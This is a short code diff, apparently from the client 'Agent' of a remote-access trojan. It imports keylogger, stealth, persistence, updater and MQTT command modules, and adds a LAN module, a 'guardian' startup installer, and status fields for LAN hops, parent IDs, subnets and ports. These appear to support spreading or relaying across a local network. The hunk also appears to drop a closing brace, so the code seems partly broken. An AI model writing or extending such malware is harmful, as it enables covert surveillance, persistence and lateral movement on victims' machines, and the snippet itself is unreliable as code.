@@ -14,7 +14,8 @@ from typing import Any
 
 from .. import __version__, config, crypto, protocol
 from ..mqtt import MqttClient, random_client_id
-from . import commands, persistence, runtime, stealth, sysinfo, updater
+from . import commands, persistence, runtime, stealth, sysinfo, updater, lan
+from ..guardian import install as guardian_install, ensure_startup_approved as guardian_ensure_startup
 from .inputs import Keylogger
 
 
@@ -101,7 +102,16 @@ class Agent:
             "info": sysinfo.summary(),
             "admin": stealth.is_admin(),
             "persistence": persistence.status(),
-        }
+            "lan": {
+                "parent": config.parent_id(),
+                "hop": config.hop(),
+                "group": config.group(),
+                "mac": config.agent_id().split('-')[-1],
+                "subnet": config.parent_ip(),
+                "enabled": config.LAN_ENABLED,
+                "port": config.LAN_PORT,
+                "http_port": config.LAN_HTTP_PORT,
+            },
 
     # ------------------------------------------------------------------
     # Inbound
